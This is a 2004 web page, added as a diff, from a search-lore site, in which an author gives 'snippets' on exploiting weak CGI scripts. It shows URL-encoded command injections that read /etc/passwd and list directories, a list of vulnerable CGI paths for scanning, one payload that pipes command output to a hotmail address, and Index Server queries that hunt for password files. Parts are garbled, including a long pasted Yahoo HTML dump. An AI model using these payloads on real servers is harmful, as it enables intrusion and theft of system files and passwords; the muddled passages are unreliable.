@@ -1,0 +1,307 @@
+<html>
+<head>
+<!-- web searching lore: pagename begin -->
+<title>sosnipo.htm: Some snippets on weak cgi scripts</title>   
+<LINK REL="SHORTCUT ICON" HREF="images/favicon.ico">
+<!-- web searching lore: pagename end -->
+<meta http-equiv="Content-Type"		content="text/html; charset=iso-8859-1">
+<meta http-equiv="Content-Style-Type"	content="text/css">
+<meta http-equiv="Content-Script-Type"	content="text/javascript">
+<meta name="description"	content="newsfeeds. generating newsfeeds. intercepting newsfeeds. news archives. searchable news archives.
+ Here are informations, forms, documents, links related to news and news archives searching on the web">
+<meta name="keywords"		content="news searching, Newspapers Searchable Archives, newsfeeds, newspapers on line, how to search news, newspapers search
+techniques, hints and tips for finding news and archives on the web, How do I find news?, Advanced Internet
+news searching, How do I search the web for news and news archives?, fravia+">
+<meta name="author"		content="fravia+">
+<meta name="copyright"		content="Copyright(c) 1952-2032 fravia+">
+
+<STYLE type="text/css">
+	A:link { color: #02F }
+	A: visited  { color: #808 }
+ 	A:hover { color: purple; background: #AFB }
+</STYLE>
+</head>
+
+<BODY bgcolor="#CCCCCC" TEXT="#001010" LINK="#0000FF" ALINK="#00FF00" VLINK="#3366CC">  
+
+<!-- Begin Introdo -->
+<center>
+<a href="ideale.htm"><IMG SRC="images/antism.gif" ALT="No_commercial!" 
+ALIGN=BOTTOM WIDTH=114 HEIGHT=43 BORDER=0 VSPACE=0 HSPACE=0></a>
+<BR>
+<Font color=gray>Searchers against Smut</fonT>
+
+<br><br><DIV><FONT  size=2>Some snippets on weak cgi scripts by 
+POLONUS</FONT></DIV><br>By POLONUS, first published in July 2004 at &nbsp;<a href="http://www.searchlores.org">www.searchlores.org</a>, 
+Version 0.05<br><hr>
+
+
+<DIV><FONT  size=2>Dear Fravia,</FONT></DIV>
+<DIV>&nbsp;</DIV>
+<DIV><FONT  size=2>Because of your request for some snippets (it is 
+not a full essay yet), &nbsp;I tried to put something in notepad and mail it to 
+you now. Maybe you can put it somehwere on your site, and work it around a bit, 
+if need be. Just like you always did, this rant of mine is meant as an 
+introduction to my list, and also for real searchers to go hunting for their own 
+lists (you will always find what you seek) that they can use in various proggies 
+to see what a server's site has in store for them or is hiding from 
+them.</FONT></DIV><br><br><i>I publish this as I got it, but it needs serious cleaning: many links wont work.
+It is still quite useful as it is.
+Readers with some free time are encouraged, by all means, to take care of this paper, restore it and re-send it to me in a better form. 
+This first 'cleaning' was made by Flux in July 2004:
+<br>
+"<font color=blue>
+
+I did some minor clean-up work on sosnipo.htm. Unfortunately, I didn't
+get very far as the second ("example") part of the document still
+remains a complete mystery to me. I think I'm not very good at
+mind-reading over the text medium (this _is_ necessary for some passages
+of this doc). Also, what is said in the first paragraphs of the text is
+mostly a duplication of the other cgi-related Searchlores pages.</font>"</i>
+
+</center>
+<hr>
+    <center>
+        <DIV><FONT  size="+2" color=blue>Some snippets on weak cgi scripts by 
+POLONUS</FONT></DIV>
+
+<p><i>Where a 'Nobody' poses a threat to Everybody, the 
+	Common Gateway Interface cannot be fully trusted.</i></p></center>
+
+<p>CGI denotes a programming style, that enhances 
+functionality on websites. Search-engines usually meet <a href="http://hoohoo.ncsa.uiuc.edu/cgi/interface.html">CGI-specification</a> 
+demands. <BR>This means however generalized standards and non platform 
+specific.</p>
+
+<p>So we have to establish the document tree, then 
+request the URL to execute it. For instance: 
+<A href="http://this site/a/path/specific_script.cgi" target="_blank">http://this site/a/path/specific_script.cgi</A>.<BR>In order to try and get what we want to learn, we have to apply similar methods like in 
+good searching in general - 
+in this case sending the script crafted query strings. So there must be a way 
+to use remote user-input through a form or a "searchable-index" command. 
+Dynamically produced indexes make the contents of a complete directory visible 
+to the user (that could be you), also private files could be 
+accessible.</p>
+
+<p>A script does not necessarily have to be 
+invoked in the way the implementer expects it to be, it can be invoked from any 
+form, anywhere in the world. The best way is to invoke the script by directly 
+requesting its URL. Alter the parameters, and we get "unexpected" values. 
+Anything could happen depending on the language used and the platform 
+it runs on. We also could use it through other web services, using search engines 
+e.d.</p>
+<p>Locally installed search engines may mean a threat, 
+as was the case with Excite's EWS, it (could) can be tricked on both UNIX and NT 
+to affect the proper website. (Not though outside linked)</p>
+<p>For instance <FONT color=blue>test.cgi</FONT>, if it is on, can produce 
+a file listing of the entire directory for us.</p>
+<p>CGI scripts are potentially insecure even though 
+the server is run as "nobody". More so if "nobody" has high privileges (see 
+title). A subverted CGI script may still hold enough privileges to even mail out 
+the system files, examine the network information maps, etc. Even in a chroot jail a 
+buggy script (and <i>a long one is by definition a buggy one</i>) may leak information 
+on the host so the host could become compromised.</p>
+<p>Some CGI scripts come all over the document tree, 
+in that case they are difficult to trace (and kept). Better if they are mainly 
+held in a cgi-bin tightly controlled access area, if not - again it is easy to 
+execute it remotely on demand requesting its URL. If the source code is not 
+known or not traceable because it is in binary form, there could be a backup copy 
+laying around from somebody who has altered it recently, look for it and request e.g : 
+<A href="http://that-site/a/path/your_script.cgi" target="_blank">http://that-site/a/path/your_script.cgi</A> 
+</p>
+<p>CGI-bin in the document root is a treasure find, 
+because source code for CGI-script written in C being is freely 
+available.</p>
+<p>Security holes are there, but we do not know them 
+yet, we must explore. <BR>A long script may have problems, programs set to read 
+are more vulnerable and leaking info. Dangerous to the curious are scripts run 
+with suid (set-user-id) priviliges. You may execute shell commands on server 
+hosts if shell metacharacters are not removed from the user-input. Shell 
+metacharacters are e.g: <b>&amp;:'|\"*?-&lt;&gt;()[]{}$\n\r.</b></p>
+<p>The strings '%0a"and '%20' are ASCII line feed and 
+blank return and can be put to good use:<BR><A 
+href="http://www.anyold.com/cgi-bin/query?%0a/bin/cat%20/etc/passwd" target="_blank">http://www.anyold.com/cgi-bin/query?%0a/bin/cat%20/etc/passwd</A> 
+<BR>You guess what happens here. And it is still around on the net! Some 
+people work with old(er) versions and leave them in the default settings.</p>
+<p>To check file permissions for you to see whether 
+the script is vulnerable (in Perl) the string <b>"%0a/bin/ls%20-la%20/usr/src/include" </b> could be appended to the URL of a CGI 
+script using GET.</p>
+<p>The easiest is if the root site is found to have 
+the defaults' install.</p>
+<ul>
+	<li>The <i><b>finger </b></i>command gives away the fingered user's home 
+	directory and scripts that invoke finger to leak this information. 
+	<li>The <i><b>w </b></i>command gives information on the programs local users are using. 
+	<li>The <i><b>ps </b></i>command renders valuable informations on what daemons are running on the system.
+</ul>
+	<BR>The home 
+directory on Unix you start in \ in our list we would look for queries with 
+include \ ""home directory.
+<hr>
+<p>After this general introduction some examples: 
+<BR>So what to do. Well construct your query according to the information you 
+like to get from the site through&nbsp; HEAD and GET. For instance I tried this 
+with <a href="http://www.cyberspyder.com/webbug.html">WebBug:</a></p>
+<p>We tried <A 
+href="http://www.findtarget.com/cb/beaucoup.php?q=weak+cgi" target="_blank">http://www.findtarget.com/cb/beaucoup.php?q=weak+cgi</A><BR>sought 
+at: <A href="http://www.beaucoup.com/cgi-bin" target="_blank">http://www.beaucoup.com/cgi-bin</A> 
+cannot be reached- then redirected to <A 
+href="http://www.findtarget.com/ch/beaucoup.php?q=" target="_blank">http://www.findtarget.com/ch/beaucoup.php?q=</A>&nbsp;&nbsp; 
+This redirect can be found if we survey cgi-bin, and we can get 
+to 1promo.html in cgi-bin etc. and have the contents of the document 
+tree.<BR>Actually the webserver has no secrets for us.</p>
+<p>Secondly we can find a neat and clean searchpage 
+through demanding the right query: (the default_index_ could be somewhere 
+else).<BR>we used webbug to get some information on the server, and find through 
+GET on <A 
+href="http://search.yahoo.com/search/dir" target="_blank">http://search.yahoo.com/search/dir</A> 
+the following information:</p>
+
+<pre>
+HTTP/1.1 200 OK<BR>Date: Sun, 20 Jun 2004 
+21:27:28 GMT<BR>P3P: policyref="http://p3p.yahoo.com/w3c/p3p.xml", 
+CP="CAO DSP COR CUR ADM DEV TAI PSA PSD IVAi IVDi CONi TELo OTPi OUR DELi SAMi 
+OTRi UNRi PUBi IND PHY ONL UNI PUR FIN COM NAV INT DEM CNT STA POL HEA PRE 
+GOV"<BR>Cache-Control: private<BR>Connection: close<BR>Content-Type: text/html; 
+charset=ISO-8859-1</pre>
+
+<p><FONT size=-1>
+    &lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"&gt;
+    <BR>&lt;html&gt;&lt;head&gt;&lt;meta 
+http-equiv="content-type" content="text/html; 
+charset=ISO-8859-1"&gt;<BR>&lt;link rel="stylesheet" href="http://us.i1.yimg.com/us.yimg.com/lib/s/ysch_051204_b.css" 
+type="text/css"&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;script 
+language="javaScript1.2"&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+if (document.layers &amp;&amp; 
+!document.getElementById)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+document.writeln('&lt;link rel="stylesheet" href="http://us.i1.yimg.com/us.yimg.com/lib/s/ysch_nn4_051004.css" 
+type="text/css"&gt; ');<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+&lt;/script&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+&lt;title&gt;Yahoo! Search Results for &lt;/title&gt;<BR>&lt;style&gt;<BR>/* 
+macIE hide \*/<BR>#yschsec li {overflow:hidden;}<BR>/* end macIE hide 
+*/<BR>&lt;/style&gt;<BR>&lt;/head&gt;<BR>&lt;body&gt;<BR>&lt;!-- SpaceID=0 robot 
+--&gt;
+&lt;div id=ygma&gt;<BR>&lt;table cellpadding=3 cellspacing=0 
+border=0&gt;<BR>&lt;tr&gt;&lt;form action="http://rds.yahoo.com/S=96062852/K=/v=2/SID=e/l=DSBT/*-http://search.yahoo.com/search/dir" 
+name=s&gt;
+<BR>&lt;td&gt;&lt;!-- SpaceID=0 robot --&gt;<BR>
+&lt;a href="http://rds.yahoo.com/S=96062852/K=/v=2/SID=e/l=HEAD/*-http://search.yahoo.com"&gt;
+&lt;img border=0 height=30 width=222 src="http://us.i1.yimg.com/us.yimg.com/i/us/search/gr/schma_1.gif" 
+alt="Yahoo!"&gt;&lt;/a&gt;&lt;/td&gt;<BR>&lt;td&gt;&lt;input size=42 name=p 
+value=""&gt;&amp;nbsp;&lt;input type=submit value="Yahoo! Search"&gt;&lt;input 
+type=hidden name="ei" value="ISO-8859-1"&gt;&lt;input type=hidden name="n" 
+value="20"&gt;&lt;input type=hidden name="fl" value="0"&gt;&lt;INPUT type=hidden 
+name=x value=drt&gt;&lt;/td&gt;<BR>&lt;td nowrap style="line-height: 
+.9em;"&gt;&lt;small&gt;&lt;a href="http://rds.yahoo.com/S=96062852/K=/v=2/SID=e/l=DAST/*-http://search.yahoo.com/dir/advanced?"&gt;Advanced&lt;/a&gt;&lt;br&gt;
+&lt;a href="http://rds.yahoo.com/S=96062852/K=/v=2/SID=e/l=DPRT/*-http://search.yahoo.com/search/preferences?pref_done=http%3A%2F%2Fsearch.yahoo.com%2Fsearch%2Fdir%3Fp%3D%26ei%3DISO-8859-1&amp;pref_cancel=http%3A%2F%2Fsearch.yahoo.com%2Fsearch%2Fdir%3F"&gt;Preferences&lt;/a&gt;
+&lt;/small&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+<BR>&lt;div&gt;&lt;/div&gt;&lt;/form&gt;<BR>&lt;/div&gt;
+<BR>&lt;hr class=yschnocss&gt;
+<BR>&lt;hr class=yschnocss&gt;
+
+<BR>&lt;div id=yschtg 
+class=yschtgdir&gt;<BR>&lt;SPAN class=yschtgpt&gt;&lt;STRONG 
+class=yschnocss&gt;Show results 
+for:&lt;/STRONG&gt;&lt;/SPAN&gt;<BR>&lt;b&gt;&lt;a href="http://rds.yahoo.com/S=96062852/K=/v=2/SID=e/l=DNWT/*-http://search.yahoo.com/search?"&gt;Web&lt;/a&gt;&lt;/b&gt;&lt;span class="yschnocss yschnn4"&gt; | &lt;/span&gt;&lt;b&gt;&lt;a href="http://rds.yahoo.com/S=96062852/K=/v=2/SID=e/l=DNIT/*-http://images.search.yahoo.com/search/images?"&gt;Images&lt;/a&gt;&lt;/b&gt;&lt;span class="yschnocss yschnn4"&gt; | &lt;/span&gt;&lt;b class=yschontb&gt;Directory&lt;/b&gt;&lt;span class="yschnocss yschnn4"&gt; | 
+&lt;/span&gt;&lt;b&gt;
+&lt;a href="http://rds.yahoo.com/S=96062852/K=/v=2/SID=e/l=DNYT/*-http://yp.search.yahoo.com/search/ypredirect?"&gt;Yellow&amp;nbsp;Pages&lt;/a&gt;&lt;/b&gt;&lt;span class="yschnocss yschnn4"&gt; | &lt;/span&gt;&lt;b&gt;
+&lt;a href="http://rds.yahoo.com/S=96062852/K=/v=2/SID=e/l=DNNT/*-http://news.search.yahoo.com/search/news?"&gt;News&lt;/a&gt;&lt;/b&gt;&lt;span class="yschnocss yschnn4"&gt; | &lt;/span&gt;&lt;b&gt;
+&lt;a href="http://rds.yahoo.com/S=96062852/K=/v=2/SID=e/l=DNPT/*-http://search.shopping.yahoo.com/search;_ylc=X3oDMTFmcDNiNjc2BF9TAzI3NjY2NzkEX3MDMTQ0ODkxMTUEc2VjA3NyY2h0YWIEc2xrA3Byb2R1Y3Rz?&amp;cop=mss" 
+id=prod&gt;Products&lt;/a&gt;&lt;/b&gt;<BR>&lt;/div&gt;<BR>&lt;hr 
+class=yschnocss&gt;<BR>&lt;div id=yschres&gt;<BR>&lt;div 
+id=yschpri&gt;<BR>&lt;br&gt;<BR>&lt;p class=err&gt;&lt;img src="http://us.i1.yimg.com/us.yimg.com/i/us/search/gr/alertbubble.gif" 
+width=23 height=19 border=0 align=middle alt=Alert&gt; Your search box was 
+empty. Please enter one or more words in the box 
+above.&lt;/p&gt;<BR>&lt;br&gt;<BR>&lt;/div&gt;<BR>&lt;/div&gt;<BR>&lt;div 
+id=yschpg&gt;&lt;p&gt;<BR>&lt;/p&gt;&lt;/div&gt;<BR>&lt;hr 
+class=yschnocss&gt;<BR>&lt;hr class=yschnocss&gt;<BR>&lt;div 
+id=yschft&gt;<BR>&lt;p&gt;&lt;small&gt;&lt;!-- SpaceID=0 robot 
+--&gt;<BR>&lt;/small&gt;&lt;/p&gt;&lt;/div&gt;<BR>&lt;img alt="" width=1 
+height=1 src="http://pa.yahoo.com/pa?q=&amp;s=96062852"&gt;<BR>&lt;form 
+name=hf&gt;&lt;input type=hidden name=p&gt;&lt;input type=hidden name="ei" 
+value="ISO-8859-1"&gt;&lt;input type=hidden name="n" value="20"&gt;&lt;input 
+type=hidden name="fl" value="0"&gt;&lt;/form&gt;<BR>&lt;form 
+name=hfps&gt;&lt;input type=hidden name=p&gt;&lt;input type=hidden name="cop" 
+value="mss"&gt;&lt;input type=hidden name="__yltc" value=""&gt;
+&lt;input type=hidden name="ei" value="ISO-8859-1"&gt;&lt;input type=hidden name="n" 
+value="20"&gt;&lt;input type=hidden name="fl" 
+value="0"&gt;&lt;/form&gt;<BR>&lt;div 
+id=yschmw&gt;&lt;div&gt;&lt;/div&gt;&lt;/div&gt;<BR>&lt;/body&gt;&lt;/html&gt;
+</FONT>
+<p>Run it as .html and enjoy.</p>
+
+<p>To introduce examples of my list of weak CGI I will start with a short 
+list with the term "search" somewhere in it. Anyway Fravia is on <a href="http://www.searchlores.org">searching 
+lores</a>. The queries are for various platforms and script. <BR>Here we go:</p>
+<ul>
+	<li>cgi-bin/htsearch
+	<li>cgi-bin/htsearch?exclude=%60%60
+	<li>bizdb1-search.cgi
+	<li>cgi-bin/bizdb1-search.cgi
+	<li>cgi-bin/bizdb1-search.cgi?template=bizdb-summary&amp;dbname=;ls|mail%20riotnation@hotmail.com|&amp;f6=^a.*&amp;action=searchdbdisplay
+	<li>cgi-bin/maillist.cgi?cmd=list&amp;fldrname=inbox&amp;fldnum=1&amp;order=2&amp;searchkey=&amp;search_fldnum=0&amp;page=999999&amp;html=
+	<li>cgi-bin/search97.vts
+	<li>cgi-bin/search.cgi%3fletter=
+	<li>cgi-bin/search.pl
+	<li>domcfg.nsf/viewname%3fSearchview&amp;Query="*"
+	<li>htsearch
+	<li>iissamples/exair/search/advsearch.asp
+<li>iissamples/exair/search/qfullhit/htw
+<li>iissamples/exair/search/qsumrhit.htw
+<li>iissamples/exair/search/query.asp
+<li>iissamples/exair/search/query.idq
+<li>iissamples/exair/search/search.asp
+<li>iissamples/exair/search/search.idq
+<li>search.dll?search?query=/&amp;logic=AND
+<li>samples/search/queryhit.htm
+<li>scripts/samples/search/author.idq
+<li>scripts/samples/search/filesize.idq
+<li>scripts/samples/search/filtime.idq
+<li>scripts/samples/search/queryhit.idq
+<li>scripts/samples/search/queryhit.idq
+<li>scripts/samples/search/queryhit.idq?CiRestriction=%23FILENAME%3D*.pwd&amp;CiMaxRecordsPerPage=10&amp;CiScope=%2F&amp;TemplateName=queryhit&amp;CiSort=rank%5Bd%5D&amp;HTMLQueryForm=%2Fsamples%2Fsearch%2Fqueryhit.htm
+<li>scripts/samples/search/queryhit.idq?CiRestriction=%23FILENAME%3D*.pwl&amp;CiMaxRecordsPerPage=10&amp;CiScope=%2F&amp;TemplateName=queryhit&amp;CiSort=rank%5Bd%5D&amp;HTMLQueryForm=%2Fsamples%2Fsearch%2Fqueryhit.htm
+<li>scripts/samples/search/simple.idq
+<li>scripts/samples/search/webhits.exe
+<li>search%3F
+<li>search97/s97_cgi.exe
+<li>search97/search97.vts
+<li>search.dll
+<li>search.dll?search?query=%00&amp;logic=AND
+<li>search/iaquery.exe%3f
+<li>search/index.htm
+<li>search/index.html
+</ul>
+<DIV>Well next time we look at it from another perspective. Parse your queries 
+well, keep your mirrors up, keep your searching pigeons flying from dungeon to 
+dungeon.</DIV>
+<DIV>&nbsp;</DIV>
+<DIV>Greetings from</DIV>
+<DIV>&nbsp;</DIV>
+<DIV>POLONUS</DIV>
+<DIV>&nbsp;</DIV>
+<DIV>&nbsp;</DIV>
+<br>
+<hr>
+<center>
+<Font size="+3">
+Good luck, good hunt!<br></Font>
+</center>
+
+<!-- internet searching strategies and hints content, end -->
+<hr width="66%"><center><a href="ideale.htm"><IMG SRC="images/basipet.jpg"
+ALT="To ideale"
+ALIGN=BOTTOM WIDTH="118" HEIGHT="68" BORDER=0 VSPACE=0
+HSPACE=0></a>
+<br>Back to ideale<br> 
+<!-- how to search the web, by fravia+, signet begin -->
+<table><tR><td width="300" height="2" bgcolor="#993300"></tD></tR></table>
+
+(c) III Millennium: <font color=blue>[</font><a href="info.htm">fravia+</a><font color=blue><font color=blue>]</fonT></font>, all rights reserved 
+<bR><!-- how to search the web, by fravia+, signet end -->
+
+
+<!-- begin da closing bit, duh -->
+</CENTER>
+</body>
+</HTML>
